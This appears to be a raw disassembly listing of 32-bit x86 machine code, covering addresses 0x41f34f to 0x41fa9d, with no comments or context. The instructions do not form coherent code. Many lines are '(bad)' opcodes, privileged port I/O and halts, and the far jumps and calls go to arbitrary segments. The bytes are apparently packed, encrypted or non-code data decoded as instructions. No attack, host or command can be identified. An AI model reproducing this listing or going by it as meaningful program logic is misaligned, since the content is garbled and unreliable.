  41f34f:	je     0x41f2d5
  41f351:	xchg   ecx,eax
  41f352:	pop    eax
  41f353:	ret    0x9277
  41f356:	rcr    DWORD PTR [ebx+0x58b0a7cc],0xf4
  41f35d:	jns    0x41f3ce
  41f35f:	sbb    eax,0xb2c6d2bb
  41f364:	es pop ecx
  41f366:	sbb    al,0xea
  41f368:	jle    0x41f2fb
  41f36a:	fs stos DWORD PTR es:[edi],eax
  41f36c:	mov    bh,0x1e
  41f36e:	jge    0x41f2f4
  41f370:	das    
  41f371:	iret   
  41f372:	sub    al,0x63
  41f374:	dec    esi
  41f375:	cmp    DWORD PTR [edx+0xa],esp
  41f378:	sub    DWORD PTR [eax],0x9ab35250
  41f37e:	gs cmp ecx,0xfffffff8
  41f382:	imul   edi,DWORD PTR [esi+0x34fcdedf],0xffffff94
  41f389:	inc    ebx
  41f38a:	xchg   edi,eax
  41f38b:	inc    ebx
  41f38c:	mov    ds:0xbdb4722f,al
  41f391:	mov    al,cs:0x87fcb21e
  41f397:	pushf  
  41f398:	jbe    0x41f371
  41f39a:	mov    ebx,0x3a883d81
  41f39f:	sbb    bh,bh
  41f3a1:	inc    eax
  41f3a2:	inc    ebp
  41f3a3:	je     0x41f353
  41f3a5:	inc    ebx
  41f3a6:	cmp    ebx,0x7755c2d6
  41f3ac:	lea    esp,[edx+0x44]
  41f3af:	adc    cl,bl
  41f3b1:	or     al,0xde
  41f3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3b4:	jns    0x41f40e
  41f3b6:	mov    eax,0xab3c0c9e
  41f3bb:	push   esi
  41f3bc:	clc    
  41f3bd:	cmp    eax,0x7db3aec7
  41f3c2:	cdq    
  41f3c3:	(bad)  
  41f3c5:	xchg   ebp,eax
  41f3c6:	adc    edx,DWORD PTR [esi]
  41f3c8:	sbb    al,BYTE PTR [esi+ecx*8+0x6e17d951]
  41f3cf:	scas   al,BYTE PTR es:[edi]
  41f3d0:	ins    DWORD PTR es:[edi],dx
  41f3d1:	int3   
  41f3d2:	pop    eax
  41f3d3:	jne    0x41f366
  41f3d5:	mov    ecx,0x3589c0fb
  41f3da:	or     ah,BYTE PTR [ecx+0x2d9c50c9]
  41f3e0:	shr    BYTE PTR [esi],0xc0
  41f3e3:	ret    
  41f3e4:	push   0x3cd86a6d
  41f3e9:	stos   BYTE PTR es:[edi],al
  41f3ea:	arpl   WORD PTR [ecx-0x7c],sp
  41f3ed:	fdivp  st(0),st
  41f3ef:	imul   edx,DWORD PTR [esi+eiz*2],0x2a3014
  41f3f6:	xchg   DWORD PTR [edi+ebx*1+0x18782978],edi
  41f3fd:	jbe    0x41f46d
  41f3ff:	and    BYTE PTR [esi],al
  41f401:	lock add ecx,DWORD PTR [eax]
  41f404:	jl     0x41f405
  41f406:	mov    esi,0x5350932
  41f40b:	or     cl,BYTE PTR [ebp+0x64]
  41f40e:	pushf  
  41f40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f410:	test   BYTE PTR [edx+eiz*4+0x148100f3],cl
  41f417:	mov    bl,0xfe
  41f419:	add    ah,dh
  41f41b:	cmp    eax,0x92c2ec2c
  41f420:	(bad)  
  41f421:	int    0xd1
  41f423:	xchg   ebx,eax
  41f424:	dec    ecx
  41f425:	rol    BYTE PTR [esp+esi*1-0x287130ce],1
  41f42c:	popa   
  41f42d:	cmp    ch,ch
  41f42f:	sbb    esp,esp
  41f431:	out    dx,al
  41f432:	xor    al,0x74
  41f434:	sub    eax,0x936e9a16
  41f439:	push   cs
  41f43a:	push   esi
  41f43b:	cmp    eax,esp
  41f43d:	push   DWORD PTR [edi+0x52d35059]
  41f443:	in     al,dx
  41f444:	inc    edx
  41f445:	jge    0x41f4af
  41f447:	inc    esp
  41f448:	xor    eax,DWORD PTR [ecx+0x56]
  41f44b:	pop    eax
  41f44c:	imul   BYTE PTR [esi]
  41f44e:	xchg   DWORD PTR [ecx+eax*8],ebx
  41f451:	push   ecx
  41f452:	aaa    
  41f453:	test   DWORD PTR [ebp-0x2e],ebp
  41f456:	sahf   
  41f457:	jne    0x41f479
  41f459:	jg     0x41f495
  41f45b:	gs add edx,edx
  41f45e:	xor    edx,edi
  41f460:	or     ebp,DWORD PTR ds:0xb43c9206
  41f466:	jae    0x41f412
  41f468:	xchg   ebp,eax
  41f469:	sub    eax,0xf946f1dd
  41f46e:	xlat   BYTE PTR ds:[ebx]
  41f46f:	mov    ds:0xebccfb27,eax
  41f474:	ja     0x41f426
  41f476:	dec    ebx
  41f477:	cmp    ah,ch
  41f479:	in     al,dx
  41f47a:	xchg   edi,eax
  41f47b:	repz xor ecx,DWORD PTR [eax+0x67]
  41f47f:	add    al,0x97
  41f481:	test   DWORD PTR [bp+si+0x385c],ebp
  41f486:	shl    DWORD PTR [edx],cl
  41f488:	jge    0x41f4d3
  41f48a:	mov    edi,0x4a9c832d
  41f48f:	ins    BYTE PTR es:[edi],dx
  41f490:	push   esi
  41f491:	js     0x41f481
  41f493:	out    0x52,al
  41f495:	lods   al,BYTE PTR ds:[esi]
  41f496:	xchg   esp,eax
  41f497:	ja     0x41f49a
  41f499:	mov    eax,0x5a9908ce
  41f49e:	scas   eax,DWORD PTR es:[edi]
  41f49f:	cmp    esp,DWORD PTR [ebx]
  41f4a1:	(bad)  
  41f4a2:	int3   
  41f4a3:	sbb    DWORD PTR [edi-0x5d66c4fa],0xa55df96d
  41f4ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ae:	mov    al,0x5d
  41f4b0:	inc    esi
  41f4b1:	jo     0x41f528
  41f4b3:	dec    ecx
  41f4b4:	inc    esi
  41f4b5:	test   DWORD PTR [ecx-0x79a541a8],edi
  41f4bb:	mov    ebx,ss
  41f4bd:	pop    ebx
  41f4be:	(bad)  
  41f4bf:	ficom  WORD PTR [esp+ebp*4-0x13]
  41f4c3:	mov    esi,0x9c683b33
  41f4c8:	bound  esi,QWORD PTR [ebp-0x1e]
  41f4cb:	test   DWORD PTR [edx],ecx
  41f4cd:	sub    ah,dl
  41f4cf:	xchg   ebx,eax
  41f4d0:	xchg   esp,eax
  41f4d1:	lods   eax,DWORD PTR ds:[esi]
  41f4d2:	push   ss
  41f4d3:	jp     0x41f48d
  41f4d5:	jmp    0x41f504
  41f4d7:	cwde   
  41f4d8:	cmc    
  41f4d9:	jns    0x41f51d
  41f4db:	mov    ds:0xcca5eaa7,eax
  41f4e0:	jl     0x41f4cb
  41f4e2:	sti    
  41f4e3:	mov    al,BYTE PTR [ebx]
  41f4e5:	push   ecx
  41f4e6:	div    DWORD PTR [edi-0x2d61066a]
  41f4ec:	inc    edi
  41f4ed:	shr    DWORD PTR [ecx+0x5a],0x32
  41f4f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4f2:	retf   
  41f4f3:	push   cs
  41f4f4:	inc    edi
  41f4f5:	(bad)  
  41f4f7:	(bad)  
  41f4f8:	or     DWORD PTR gs:[eax-0x35],esp
  41f4fc:	push   cs
  41f4fd:	(bad)  
  41f4fe:	int3   
  41f4ff:	retf   
  41f500:	(bad)  
  41f501:	hlt    
  41f502:	or     DWORD PTR [edx],edi
  41f504:	repnz repz rcl BYTE PTR [eax+edx*2],cl
  41f509:	ds jge 0x41f4fe
  41f50c:	mov    fs:0x110f0f58,eax
  41f512:	out    0x7c,al
  41f514:	leave  
  41f515:	imul   edx,ebp,0x88bf6810
  41f51b:	fiadd  WORD PTR [ebp-0x100d3b85]
  41f521:	cmp    ebx,esi
  41f523:	jp     0x41f4e6
  41f525:	jmp    0x41f4c6
  41f527:	out    0xa0,eax
  41f529:	xchg   esi,eax
  41f52a:	in     al,0xb0
  41f52c:	inc    esp
  41f52d:	test   BYTE PTR [ebp+0x29],ah
  41f530:	sbb    al,al
  41f532:	les    esp,FWORD PTR [ecx]
  41f534:	mov    ds:0x6fdcce8a,eax
  41f539:	xor    BYTE PTR [ecx-0x2dc6f8fe],dh
  41f53f:	sbb    DWORD PTR [edi+0x39],ecx
  41f542:	mov    ebp,0x7a945ea5
  41f547:	jb     0x41f57e
  41f549:	mov    ch,0x40
  41f54b:	dec    ecx
  41f54c:	sbb    al,0x7d
  41f54e:	or     eax,0xd332b547
  41f553:	and    cl,dh
  41f555:	or     eax,0xd0399281
  41f55a:	xchg   ebx,ebx
  41f55c:	call   0xd622bebd
  41f561:	sub    al,0x39
  41f563:	pop    edx
  41f564:	stos   BYTE PTR es:[edi],al
  41f565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f566:	aas    
  41f567:	inc    esi
  41f568:	aaa    
  41f569:	xchg   edx,eax
  41f56a:	jnp    0x41f590
  41f56c:	cmp    ebp,ebp
  41f56e:	rcl    ch,0x53
  41f571:	mov    ds:0x6b401c34,al
  41f576:	popa   
  41f577:	lds    ebx,FWORD PTR [esi+eiz*1-0x20]
  41f57b:	push   esp
  41f57c:	data16 mov al,0x2c
  41f57f:	sub    esp,DWORD PTR [edx+0x3]
  41f582:	fiadd  WORD PTR [edi+0x145369f2]
  41f588:	jg     0x41f59b
  41f58a:	scas   al,BYTE PTR es:[edi]
  41f58b:	inc    edx
  41f58c:	xchg   edi,eax
  41f58d:	pop    ebx
  41f58e:	shl    DWORD PTR [edx-0x450c263a],cl
  41f594:	hlt    
  41f595:	shl    BYTE PTR [ecx-0x1d67c1fb],1
  41f59b:	in     al,dx
  41f59c:	jmp    0x892f:0xdf031d0b
  41f5a3:	pop    eax
  41f5a4:	shr    DWORD PTR [eax-0x71],0xce
  41f5a8:	retf   
  41f5a9:	or     BYTE PTR [ebp-0x8],0x43
  41f5ad:	sub    DWORD PTR [edx+0x2b],esi
  41f5b0:	ret    
  41f5b1:	test   DWORD PTR [ecx+ebx*4-0x35],esi
  41f5b5:	stos   BYTE PTR es:[edi],al
  41f5b6:	inc    BYTE PTR [edi+0x65efdaf4]
  41f5bc:	fild   DWORD PTR ds:[edx+ebx*1+0x564ab567]
  41f5c4:	xchg   esp,eax
  41f5c5:	push   edx
  41f5c6:	sti    
  41f5c7:	shr    BYTE PTR [edi],0xd
  41f5ca:	mov    ecx,DWORD PTR [ebp-0x14]
  41f5cd:	sub    DWORD PTR [ebp-0x3c31171f],0x57
  41f5d4:	cmp    DWORD PTR [esi-0x59f0b10f],esi
  41f5da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5db:	enter  0x228,0xd7
  41f5df:	sub    al,0x28
  41f5e1:	(bad)  
  41f5e2:	xchg   BYTE PTR [edx],ah
  41f5e4:	lahf   
  41f5e5:	clc    
  41f5e6:	mov    bl,0x80
  41f5e8:	fwait
  41f5e9:	(bad)  
  41f5ea:	movzx  ebp,BYTE PTR [ecx-0x4c]
  41f5ee:	pop    ds
  41f5ef:	pop    ebp
  41f5f0:	fcom   DWORD PTR [eax]
  41f5f2:	pop    edi
  41f5f3:	cmp    al,0x5b
  41f5f5:	dec    edi
  41f5f6:	imul   BYTE PTR [ecx]
  41f5f8:	cmp    ebp,esp
  41f5fa:	sub    ecx,DWORD PTR [esi]
  41f5fc:	jne    0x41f632
  41f5fe:	js     0x41f591
  41f600:	or     ax,WORD PTR [ebp+ebp*4+0x2b]
  41f605:	js     0x41f59d
  41f607:	cld    
  41f608:	popa   
  41f609:	pusha  
  41f60a:	cmp    eax,0x69103dfe
  41f60f:	push   ecx
  41f610:	cmp    al,0x3a
  41f612:	lahf   
  41f613:	pop    eax
  41f614:	mov    ecx,0x1aee0b32
  41f619:	jmp    0xe12d0a64
  41f61e:	dec    ecx
  41f61f:	mov    bl,0x3d
  41f621:	call   0x572:0xcef155ec
  41f628:	xor    al,0xe9
  41f62a:	and    bl,ah
  41f62c:	aam    0xa7
  41f62e:	pop    esp
  41f62f:	dec    ebx
  41f630:	int    0x18
  41f632:	js     0x41f5b6
  41f634:	add    ecx,esp
  41f636:	mov    ah,0x78
  41f638:	repnz mov ebp,0xd8aae384
  41f63e:	rcl    DWORD PTR [ecx+0x2a],cl
  41f641:	ss std 
  41f643:	(bad)  
  41f644:	jns    0x41f634
  41f646:	cmp    DWORD PTR [esi-0x40],ebp
  41f649:	mov    ds:0x5c22e747,eax
  41f64e:	push   ds
  41f64f:	pushf  
  41f650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f651:	pop    ebx
  41f652:	pop    es
  41f653:	or     al,0x5e
  41f655:	(bad)  
  41f656:	jb     0x41f5ec
  41f658:	cwde   
  41f659:	xchg   DWORD PTR [ebx+0x40],ebx
  41f65c:	sbb    esp,DWORD PTR [edi-0x5c0fb395]
  41f662:	aad    0x71
  41f664:	test   ebp,esp
  41f666:	test   DWORD PTR [edi-0x16c64fa5],eax
  41f66c:	xchg   edi,eax
  41f66d:	pushf  
  41f66e:	mov    WORD PTR [edx+0x733c875b],fs
  41f674:	mov    DWORD PTR [ebx-0x2202ce52],edi
  41f67a:	clc    
  41f67b:	out    0xb6,al
  41f67d:	cmc    
  41f67e:	push   esi
  41f67f:	icebp  
  41f680:	jnp    0x41f68e
  41f682:	cli    
  41f683:	rol    BYTE PTR [ebp+0x69],1
  41f686:	nop
  41f687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f688:	fstp   DWORD PTR [edx-0x7d]
  41f68b:	or     ecx,ecx
  41f68d:	jmp    0x41f6a4
  41f68f:	std    
  41f690:	popf   
  41f691:	mov    eax,0x3432f61d
  41f696:	and    BYTE PTR [edx],dh
  41f698:	mov    ch,0x19
  41f69a:	dec    esp
  41f69b:	dec    eax
  41f69c:	jb     0x41f6cf
  41f69e:	pop    edx
  41f69f:	xchg   esi,eax
  41f6a0:	pusha  
  41f6a1:	arpl   WORD PTR fs:[ebp+0x34570067],bx
  41f6a8:	jo     0x41f6b6
  41f6aa:	xor    BYTE PTR [edi-0x70],dl
  41f6ad:	or     ah,ch
  41f6af:	push   ecx
  41f6b0:	dec    esi
  41f6b1:	and    BYTE PTR [edi*2+0x103a822f],0x89
  41f6b9:	adc    eax,0x451ebb3f
  41f6be:	test   eax,0x4482529
  41f6c3:	out    0x34,al
  41f6c5:	inc    esi
  41f6c6:	xor    ecx,0x5bf1d622
  41f6cc:	adc    DWORD PTR es:[edx+0x55],ecx
  41f6d0:	mov    cl,0x51
  41f6d2:	xor    al,0x1b
  41f6d4:	jecxz  0x41f678
  41f6d6:	pop    esi
  41f6d7:	and    BYTE PTR [ebp+0x42],0xc2
  41f6db:	pmuludq mm1,mm0
  41f6de:	repnz aaa 
  41f6e0:	fs pop esi
  41f6e2:	sub    eax,0x479d643
  41f6e7:	mov    DWORD PTR [ecx+0x3],esi
  41f6ea:	mov    fs:0x92ac65fd,al
  41f6f0:	dec    ebp
  41f6f1:	fld    TBYTE PTR [edx]
  41f6f3:	push   esp
  41f6f4:	outs   dx,BYTE PTR ds:[esi]
  41f6f5:	sbb    al,0xbc
  41f6f7:	xchg   edi,eax
  41f6f8:	xchg   edx,eax
  41f6f9:	inc    esi
  41f6fa:	int3   
  41f6fb:	in     al,dx
  41f6fc:	mov    esp,0x908d5bdc
  41f701:	xchg   edi,eax
  41f702:	mov    ds:0x58140d74,eax
  41f707:	out    0x96,al
  41f709:	or     dl,cl
  41f70b:	or     dh,BYTE PTR [edi+0x373e7ae4]
  41f711:	push   ds
  41f712:	das    
  41f713:	jnp    0x41f71d
  41f715:	or     ch,ah
  41f717:	lock and bl,BYTE PTR [ebp+0xeb7e48d]
  41f71e:	inc    eax
  41f71f:	shr    DWORD PTR [ecx+eax*2-0x6ae08da5],1
  41f726:	inc    edi
  41f727:	fcmovnbe st,st(4)
  41f729:	iret   
  41f72a:	pusha  
  41f72b:	sahf   
  41f72c:	fwait
  41f72d:	mov    cl,0x17
  41f72f:	mov    al,ds:0x9bf9c15a
  41f734:	(bad)  
  41f736:	lock call 0x22e7:0x62046941
  41f73e:	call   0x2419:0xf46b45
  41f745:	and    eax,DWORD PTR [ebx+0x39]
  41f748:	imul   eax,DWORD PTR [edx-0x5f],0xd3e6ee81
  41f74f:	mov    esp,DWORD PTR [esi-0x41]
  41f752:	stc    
  41f753:	push   esp
  41f754:	push   ds
  41f755:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41f757:	and    eax,DWORD PTR [ebx+0x2e]
  41f75a:	pop    ebx
  41f75b:	outs   dx,BYTE PTR ds:[esi]
  41f75c:	enter  0x2760,0xbc
  41f760:	fdivr  DWORD PTR [eax]
  41f762:	scas   al,BYTE PTR es:[edi]
  41f763:	push   ds
  41f764:	mov    eax,ds:0x48cd9339
  41f769:	stos   BYTE PTR es:[edi],al
  41f76a:	xchg   edx,eax
  41f76b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f76c:	in     al,dx
  41f76d:	inc    esp
  41f76e:	sar    BYTE PTR [eax],0xcc
  41f771:	mov    ecx,DWORD PTR [ecx-0x293f241b]
  41f777:	popa   
  41f778:	sar    dl,1
  41f77a:	sbb    eax,edi
  41f77c:	dec    eax
  41f77d:	push   edi
  41f77e:	js     0x41f7d4
  41f780:	dec    esi
  41f781:	pusha  
  41f782:	or     eax,0xd3e801ed
  41f787:	push   ebx
  41f788:	mov    bh,0x43
  41f78a:	ss jle 0x41f7bb
  41f78d:	jb     0x41f7b8
  41f78f:	enter  0x9e49,0x1f
  41f793:	adc    dl,BYTE PTR [edi-0x2495ea1f]
  41f799:	lea    esp,[edi-0x1a]
  41f79c:	xor    eax,DWORD PTR [edx+0x6977a161]
  41f7a2:	lahf   
  41f7a3:	jge    0x41f795
  41f7a5:	add    esi,edi
  41f7a7:	xlat   BYTE PTR ds:[ebx]
  41f7a8:	or     eax,0x6242239c
  41f7ad:	out    dx,al
  41f7ae:	inc    eax
  41f7af:	sub    ecx,DWORD PTR ds:0xa6b5d628
  41f7b5:	mov    DWORD PTR [eax],eax
  41f7b7:	fwait
  41f7b8:	loopne 0x41f79c
  41f7ba:	(bad)
  41f7be:	dec    eax
  41f7bf:	out    0x38,eax
  41f7c1:	int3   
  41f7c2:	outs   dx,DWORD PTR ds:[esi]
  41f7c3:	push   esi
  41f7c4:	and    BYTE PTR [ecx-0x59],0xb7
  41f7c8:	push   ds
  41f7c9:	mov    ch,0x94
  41f7cb:	mov    ebx,0xd737547d
  41f7d0:	call   0xf91dc989
  41f7d5:	mov    DWORD PTR [eax],edi
  41f7d7:	(bad)  
  41f7d8:	mov    bl,0x4d
  41f7da:	xchg   edx,eax
  41f7db:	jne    0x41f77e
  41f7dd:	adc    BYTE PTR [edi],ah
  41f7df:	sbb    DWORD PTR [ebx+0x6],edx
  41f7e2:	rcl    cl,0xf
  41f7e5:	adc    al,0xda
  41f7e7:	retf   
  41f7e8:	pop    ss
  41f7e9:	inc    ebx
  41f7ea:	mov    dh,dh
  41f7ec:	pop    ebx
  41f7ed:	push   esi
  41f7ee:	cmp    dl,BYTE PTR [si-0x3dd9]
  41f7f3:	pop    ebp
  41f7f4:	dec    esi
  41f7f5:	addr16 mov eax,0xea41b487
  41f7fb:	aas    
  41f7fc:	xor    esi,DWORD PTR ds:0x81b63347
  41f802:	(bad)  [ecx]
  41f804:	shl    DWORD PTR [edi],1
  41f806:	test   DWORD PTR [esi],edx
  41f808:	xchg   edx,eax
  41f809:	jge    0x41f879
  41f80b:	imul   ebx,DWORD PTR [esi+0x355fa517],0x1e
  41f812:	sub    eax,0x989837f6
  41f817:	gs push ds
  41f819:	push   ecx
  41f81a:	shl    DWORD PTR [ebp+0x28b72f47],1
  41f820:	sbb    al,0xfb
  41f822:	jns    0x41f839
  41f824:	outs   dx,DWORD PTR ds:[esi]
  41f825:	sbb    esi,edx
  41f827:	xor    eax,0xb41c64f7
  41f82c:	mov    ecx,0xa277c7b5
  41f831:	mov    si,0x45b3
  41f835:	cmp    bh,BYTE PTR ds:0xd12e15e7
  41f83b:	addr16 (bad) 
  41f83d:	icebp  
  41f83e:	daa    
  41f83f:	mov    bh,0x72
  41f841:	out    dx,eax
  41f842:	bound  esi,QWORD PTR [eax]
  41f844:	jg     0x41f893
  41f846:	or     al,0xad
  41f848:	jg     0x41f7d2
  41f84a:	addr16 jbe 0x41f814
  41f84d:	and    eax,ebx
  41f84f:	cmp    DWORD PTR gs:[edx+eax*2],esp
  41f853:	mov    al,0x7e
  41f855:	mov    ah,ch
  41f857:	es nop
  41f859:	lock mov bl,0xc4
  41f85c:	fwait
  41f85d:	xchg   edi,eax
  41f85e:	pop    edi
  41f85f:	pop    esp
  41f860:	xchg   ebp,eax
  41f861:	dec    esp
  41f862:	test   al,0x78
  41f864:	sbb    DWORD PTR [edi],0x2a
  41f867:	mov    ch,0x41
  41f869:	mov    ds:0xd7619176,eax
  41f86e:	ins    BYTE PTR es:[edi],dx
  41f86f:	clc    
  41f870:	(bad)  
  41f871:	call   0xf90d1b5c
  41f876:	xchg   ebp,eax
  41f877:	pushf  
  41f878:	mov    ch,0x75
  41f87a:	shl    ecx,0x34
  41f87d:	lods   eax,DWORD PTR ds:[esi]
  41f87e:	sub    dh,BYTE PTR [ecx-0xefff599]
  41f884:	sbb    eax,0x77ade9ad
  41f889:	loope  0x41f878
  41f88b:	pop    eax
  41f88c:	dec    edx
  41f88d:	jo     0x41f864
  41f88f:	sub    DWORD PTR ds:0x64a336b6,ecx
  41f895:	imul   DWORD PTR [edx]
  41f897:	push   0xfffffffd
  41f899:	mov    ds:0x89d4a7f6,al
  41f89e:	mov    ah,0x3
  41f8a0:	pop    ds
  41f8a1:	pop    ebp
  41f8a2:	mov    dl,0xc0
  41f8a4:	pop    ds
  41f8a5:	cmp    dl,BYTE PTR [ebx+0x3a50d79]
  41f8ab:	(bad)  
  41f8ad:	pop    edx
  41f8ae:	out    dx,al
  41f8af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8b0:	out    0x9e,al
  41f8b2:	mov    esi,0x2af8f239
  41f8b7:	gs ss mov cl,0xd5
  41f8bb:	hlt    
  41f8bc:	pop    edi
  41f8bd:	xlat   BYTE PTR ds:[ebx]
  41f8be:	sbb    eax,0xfee62f69
  41f8c3:	xchg   ebp,eax
  41f8c4:	jae    0x41f872
  41f8c6:	xor    eax,esp
  41f8c8:	sbb    BYTE PTR [ebx-0x6e],0x21
  41f8cc:	out    0xe2,al
  41f8ce:	or     BYTE PTR [ecx+0x64],0xe9
  41f8d2:	or     al,0x98
  41f8d4:	ins    BYTE PTR es:[edi],dx
  41f8d5:	(bad)  
  41f8d6:	aad    0xdd
  41f8d8:	or     eax,0x511e205
  41f8dd:	mov    eax,ds:0x2698a1d0
  41f8e2:	cli    
  41f8e3:	adc    DWORD PTR [edi+0x5ceb044d],esp
  41f8e9:	outs   dx,BYTE PTR ds:[esi]
  41f8ea:	fdivr  QWORD PTR [eax-0x18fe13d3]
  41f8f0:	pusha  
  41f8f1:	push   esp
  41f8f2:	fnstenv [edx+0x15565b0c]
  41f8f8:	in     eax,dx
  41f8f9:	aas    
  41f8fa:	adc    bl,BYTE PTR [esi]
  41f8fc:	dec    ebx
  41f8fd:	in     eax,dx
  41f8fe:	sti    
  41f8ff:	sbb    dh,BYTE PTR [edx+0x43848fb0]
  41f905:	icebp  
  41f906:	stos   DWORD PTR es:[edi],eax
  41f907:	jg     0x41f8b3
  41f909:	and    ebx,DWORD PTR ds:0xa27a6b41
  41f90f:	adc    DWORD PTR [edx-0x7c],0x48
  41f913:	nop
  41f914:	(bad)
  41f917:	scas   al,BYTE PTR es:[edi]
  41f918:	cmp    ebx,DWORD PTR [eax]
  41f91a:	shl    bl,1
  41f91c:	pusha  
  41f91d:	sti    
  41f91e:	lods   eax,DWORD PTR ds:[esi]
  41f91f:	(bad)  
  41f920:	int3   
  41f921:	in     eax,dx
  41f922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f923:	les    edi,FWORD PTR [ebp-0x6fd1c17e]
  41f929:	ds mov dh,0xf9
  41f92c:	jno    0x41f953
  41f92e:	add    eax,0x294ded5f
  41f933:	adc    esi,eax
  41f935:	ficom  WORD PTR [edi+0x5e]
  41f938:	dec    ebp
  41f939:	jecxz  0x41f8e6
  41f93b:	inc    ecx
  41f93c:	jae    0x41f8c9
  41f93e:	repnz mov dl,ch
  41f941:	jne    0x41f9aa
  41f943:	retf   
  41f944:	jno    0x41f8cd
  41f946:	sahf   
  41f947:	sbb    bh,al
  41f949:	imul   esi,DWORD PTR ds:0x78681afb,0x76c5f0fd
  41f953:	jns    0x41f8df
  41f955:	cld    
  41f956:	xor    esp,edi
  41f958:	scas   al,BYTE PTR es:[edi]
  41f959:	lea    ebp,[ebp+esi*4-0x2a]
  41f95d:	cmp    DWORD PTR [edx-0x405fc6ec],ebp
  41f963:	ds (bad) 
  41f965:	push   edx
  41f966:	dec    eax
  41f967:	xchg   DWORD PTR cs:[esi],esp
  41f96a:	rol    DWORD PTR [ebx+0x5ba96992],1
  41f970:	js     0x41f979
  41f972:	cmp    al,0x5d
  41f974:	es or  ebx,ebx
  41f977:	sub    eax,0x4457e57e
  41f97c:	jge    0x41f96d
  41f97e:	or     eax,0x79be08f4
  41f983:	cmp    al,0xe2
  41f985:	add    esp,DWORD PTR [ecx+0x73]
  41f988:	jmp    0x8482:0x901d08fe
  41f98f:	leave  
  41f990:	pop    esi
  41f991:	jp     0x41f9bf
  41f993:	pushf  
  41f994:	push   es
  41f995:	bound  esi,QWORD PTR [eax+0x72]
  41f998:	jg     0x41f98b
  41f99a:	cld    
  41f99b:	test   BYTE PTR [ecx],bl
  41f99d:	or     dh,BYTE PTR [ecx-0x77]
  41f9a0:	lahf   
  41f9a1:	xchg   ebx,eax
  41f9a2:	pop    edi
  41f9a3:	xor    eax,0x85186c8f
  41f9a8:	adc    ch,BYTE PTR [ebx-0x7ee27a58]
  41f9ae:	std    
  41f9af:	push   ds
  41f9b0:	sub    cl,BYTE PTR [eax+0x49]
  41f9b3:	sahf   
  41f9b4:	sub    ebp,ebp
  41f9b6:	mov    esp,0xd8786389
  41f9bb:	dec    esi
  41f9bc:	sbb    DWORD PTR [edx-0x51e8c49c],esi
  41f9c2:	sti    
  41f9c3:	fnstsw WORD PTR [ebp-0x4424e64e]
  41f9c9:	js     0x41f9dc
  41f9cb:	popf   
  41f9cc:	mov    ds:0x50ef2f62,al
  41f9d1:	mov    dh,BYTE PTR [edx+0x52]
  41f9d4:	inc    edi
  41f9d5:	or     edx,DWORD PTR [edx]
  41f9d7:	jp     0x41f9c8
  41f9d9:	pop    ebx
  41f9da:	inc    esi
  41f9db:	mov    bl,0x83
  41f9dd:	jp     0x41f9c3
  41f9df:	inc    ecx
  41f9e0:	inc    esp
  41f9e1:	inc    edx
  41f9e2:	sub    eax,0xf2589851
  41f9e7:	mov    ch,0x6e
  41f9e9:	icebp  
  41f9ea:	hlt    
  41f9eb:	pop    eax
  41f9ec:	dec    edi
  41f9ed:	out    0x5c,eax
  41f9ef:	sbb    eax,0x26151634
  41f9f4:	cmc    
  41f9f5:	scas   eax,DWORD PTR es:[edi]
  41f9f6:	lea    edi,[eax-0x572314bb]
  41f9fc:	je     0x41f982
  41f9fe:	xchg   edi,eax
  41f9ff:	dec    edi
  41fa00:	in     al,dx
  41fa01:	jl     0x41fa17
  41fa03:	cmp    dl,ah
  41fa05:	ss jle 0x41f9a4
  41fa08:	push   cs
  41fa09:	(bad)  
  41fa0a:	stc    
  41fa0b:	push   eax
  41fa0c:	jo     0x41f9ee
  41fa0e:	cmc    
  41fa0f:	cli    
  41fa10:	cmp    eax,ebx
  41fa12:	pusha  
  41fa13:	push   esi
  41fa14:	test   eax,0x2794903e
  41fa19:	rcr    ah,0x21
  41fa1c:	xchg   BYTE PTR [edi-0x42553cfc],bh
  41fa22:	aaa    
  41fa23:	fsub   st,st(0)
  41fa25:	stc    
  41fa26:	mov    bh,0x10
  41fa28:	xor    bl,ah
  41fa2a:	sbb    ebx,DWORD PTR [edi]
  41fa2c:	inc    ebp
  41fa2d:	sbb    al,0x36
  41fa2f:	xor    ah,dl
  41fa31:	daa    
  41fa32:	scas   al,BYTE PTR es:[edi]
  41fa33:	in     eax,0xf0
  41fa35:	pop    ebx
  41fa36:	jmp    0x41fa94
  41fa38:	ret    0x5c6b
  41fa3b:	inc    ebp
  41fa3c:	xor    ch,BYTE PTR [eax]
  41fa3e:	mov    edx,0x1b1e7e93
  41fa43:	(bad)  
  41fa44:	push   eax
  41fa45:	repnz popf 
  41fa47:	das    
  41fa48:	pop    ecx
  41fa49:	push   ds
  41fa4a:	outs   dx,DWORD PTR ds:[esi]
  41fa4b:	jno    0x41fa92
  41fa4d:	out    dx,eax
  41fa4e:	jno    0x41fa95
  41fa50:	lock cmp edx,edx
  41fa53:	or     DWORD PTR [edx-0x42d8d994],ebx
  41fa59:	ja     0x41faba
  41fa5b:	or     edx,DWORD PTR [eax]
  41fa5d:	mov    ds:0x1505f873,al
  41fa62:	hlt    
  41fa63:	jmp    0xc892:0xf42cbda5
  41fa6a:	repnz cli 
  41fa6c:	inc    esi
  41fa6d:	push   edi
  41fa6e:	dec    ebx
  41fa6f:	je     0x41fa33
  41fa71:	aad    0x4b
  41fa73:	int3   
  41fa74:	and    BYTE PTR [edx+esi*1],dh
  41fa77:	fcom   QWORD PTR [edi+0x50]
  41fa7a:	cmp    eax,0x324d35f
  41fa7f:	cmp    esi,ebp
  41fa81:	std    
  41fa82:	push   ebx
  41fa83:	and    DWORD PTR [esi+0x3e2667b5],0x2cf40b6
  41fa8d:	lods   al,BYTE PTR ds:[esi]
  41fa8e:	cld    
  41fa8f:	add    DWORD PTR [ecx+0x60f639e2],ecx
  41fa95:	sbb    esi,DWORD PTR [esp+esi*4-0x7ec35f4e]
  41fa9c:	pop    esi
  41fa9d:	mov    edi,eax
